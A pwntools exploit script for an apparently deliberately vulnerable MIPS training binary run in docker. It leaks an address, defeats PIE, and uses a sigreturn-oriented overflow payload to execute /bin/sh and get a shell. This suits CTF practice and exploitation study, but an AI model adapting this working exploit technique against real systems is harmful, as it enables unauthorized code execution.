from pwn import *
from mips_pwn_lib import *


# initialize the binary
build = 'mipsel32r6-glibc'
binary = "mips32r6le_pie_o32"
elf = context.binary = ELF("../binaries/"+binary, checksec=False)
docker = ELF('/usr/bin/docker',checksec=False)

gs = """
set architecture mips:isa32r6
break main
continue
"""

if args.GDB:
    context.terminal = ["tmux", "splitw", "-h", "-l", "65%"]
    p = docker.process(['run','-i','--rm','-v','../binaries:/target/ctf','-p','1234:1234','--name',binary,f'legoclones/mips-pwn:{build}','chroot','/target','/qemu','-g','1234','/ctf/'+binary])
    print("Remote debugging started...")
    gdb.attach(("127.0.0.1",1234), gdbscript=gs, exe="../binaries/"+binary)
else:
    p = docker.process(['run','-i','--rm','-v','../binaries:/target/ctf','--name',binary,f'legoclones/mips-pwn:{build}','chroot','/target','/qemu','/ctf/'+binary])


### EXPLOIT ###
SYSCALL_SIGRET = 4119
SS = (str(SYSCALL_SIGRET)+'\x00').encode()

syscall_addr = int(p.readline().strip(),16)+12
print(f'syscall(): {hex(syscall_addr)}')
elf.address = syscall_addr - elf.sym['syscall_inst'] - 12

frame = MIPS_o32_LE_SigreturnFrame()
frame.v0 = 4011                             # syscall: execve
frame.a0 = next(elf.search(b'/bin/sh'))     # filename: "/bin/sh"
frame.a1 = 0                                # argv: NULL
frame.a2 = 0                                # envp: NULL
frame.pc = syscall_addr                     # next instruction: syscall
frame.sp = elf.address+0x20f00              # MIPS needs valid stack pointer

payload = flat(
    SS,                                     # atoi() input to control $rax
    b'a'*(0x24-len(SS)),                    # padding
    p32(syscall_addr),                      # go to syscall instruction
    bytes(frame)                            # sigreturn frame
)
p.sendline(payload)
p.interactive()
p.close()


### CLEANUP ###
print('[+] Removing docker container...')
subprocess.getoutput('docker stop ' + binary+' && docker rm ' + binary)